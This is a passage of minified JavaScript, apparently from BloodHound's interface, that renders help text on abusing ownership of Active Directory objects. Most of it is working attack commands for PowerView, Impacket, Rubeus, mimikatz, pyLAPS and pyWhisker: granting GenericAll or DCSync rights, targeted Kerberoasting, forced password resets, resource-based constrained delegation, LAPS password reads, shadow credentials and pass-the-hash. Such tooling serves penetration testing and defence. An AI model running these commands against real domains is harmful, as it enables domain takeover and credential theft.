$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObjectOwner -Credential $Cred -TargetIdentity dfm -OwnerIdentity harmj0y"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a user object, you may grant yourself the GenericAll privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All"}),e.jsx(t,{variant:"body1",children:" Targeted Kerberoast "}),e.jsx(t,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),e.jsx(t,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),e.jsx(t,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"}),e.jsx(t,{variant:"body1",children:"Force Change Password "}),e.jsx(t,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),e.jsx(t,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),e.jsxs(t,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed with Remove-DomainObjectAcl:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All"}),e.jsx(t,{variant:"body2",children:"Cleanup for the owner can be done by using Set-DomainObjectOwner once again"})]});case"Computer":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObjectOwner -Credential $Cred -TargetIdentity windows1 -OwnerIdentity harmj0y"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll privilege."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),e.jsx(t,{variant:"body2",children:"Once you have granted yourself this privilege, you may read the ms-Ads-AdmPwd attribute on the computer object in LDAP which contains the local administrator password."}),e.jsx(t,{variant:"body2",children:"Alternatively, you can perform a resource based constrained delegation attack."}),e.jsx(t,{variant:"body2",children:"Generic write to a computer object can be used to perform a resource based constrained delegation attack."}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"}),e.jsx(t,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),e.jsx(t,{variant:"body2",children:"Cleanup for the owner can be done by using Set-DomainObjectOwner once again"})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObjectOwner -Credential $Cred -TargetIdentity testlab.local -OwnerIdentity harmj0y"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync privileges."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"}),e.jsx(t,{variant:"body2",children:"Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain"}),e.jsx(t,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),e.jsx(t,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"}),e.jsx(t,{variant:"body2",children:"Cleanup for the owner can be done by using Set-DomainObjectOwner once again"})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObjectOwner -Credential $Cred -TargetIdentity TestGPO -OwnerIdentity harmj0y"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync privileges."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"}),e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse"}),e.jsx(t,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"}),e.jsx(t,{variant:"body2",children:"Cleanup for the owner can be done by using Set-DomainObjectOwner once again"})]});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Organizational Unit"}),e.jsx(t,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as a member of (the group that holds this ACE):"}),e.jsx(t,{component:"pre",children:"Set-DomainObjectOwner -Credential $Cred -TargetIdentity dfm -OwnerIdentity harmj0y"}),e.jsx(t,{variant:"body2",children:"Now with ownership of the OU object, you may grant yourself the GenericAll privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsx(t,{component:"pre",children:`Add-DomainObjectAcl -TargetIdentity ${i} -Rights All`}),e.jsx(t,{variant:"body2",children:"With full control of the OU, you may now add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:"The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. Again, this can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU."}),e.jsxs(t,{variant:"body2",children:["First, we need to reference the OU by its ObjectGUID, not its name. The ObjectGUID for the OU"," ",a," is: ",i,"."]}),e.jsxs(t,{variant:"body2",children:["Next, we will fetch the GUID for all objects. This should be",e.jsx(t,{component:"pre",children:"'00000000-0000-0000-0000-000000000000':"})]}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name`}),e.jsx(t,{variant:"body2",children:'Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:'}),e.jsx(t,{component:"pre",children:"$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"}),e.jsx(t,{variant:"body2",children:"Finally, we will apply this ACE to our target OU:"}),e.jsx(t,{component:"pre",children:`$OU = Get-DomainOU -Raw (OU GUID)
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:`If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" privilege against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:`}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`})]});default:return null}},zd=({sourceName:n,sourceType:r,targetName:a,targetType:s,haslaps:i})=>{switch(s){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).`}),e.jsx(t,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),e.jsx(t,{variant:"body1",children:" Modifying the rights "}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a group object, you may grant yourself the AddMember privilege."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" Adding to the group "}),e.jsx(t,{variant:"body2",children:"You can now add members to the group."}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),e.jsx(t,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",e.jsx(t,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),e.jsx(t,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),e.jsx(t,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsx(t,{variant:"body1",children:" Cleanup "}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).`}),e.jsx(t,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a user object, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{variant:"body1",children:" Targeted Kerberoast "}),e.jsxs(t,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),e.jsx(t,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),e.jsx(t,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."}),e.jsx(t,{variant:"body1",children:" Force Change Password "}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),e.jsx(t,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",e.jsx(t,{component:"pre",children:" ffffffffffffffffffffffffffffffff"}),"."]}),e.jsx(t,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege, use"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Computer":return i?e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).`}),e.jsx(t,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{variant:"body1",children:" Retrieve LAPS Password "}),e.jsx(t,{variant:"body2",children:"Full control of a computer object is abusable when the computer's local admin account credential is controlled with LAPS. The clear-text password for the local administrator account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd. With full control of the computer object, you may have the ability to read this attribute, or grant yourself the ability to read the attribute by modifying the computer object's security descriptor."}),e.jsxs(t,{variant:"body2",children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used to retrieve LAPS passwords:"]}),e.jsx(t,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege, use"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]}):e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).`}),e.jsx(t,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege, use"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).`}),e.jsx(t,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync privileges."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'DCSync' -rights 'FullControl' -principal 'controlledUser' -target-dn 'DomainDisinguishedName' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{variant:"body1",children:" DCSync "}),e.jsxs(t,{variant:"body2",children:["The AllExtendedRights privilege grants ",n," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain 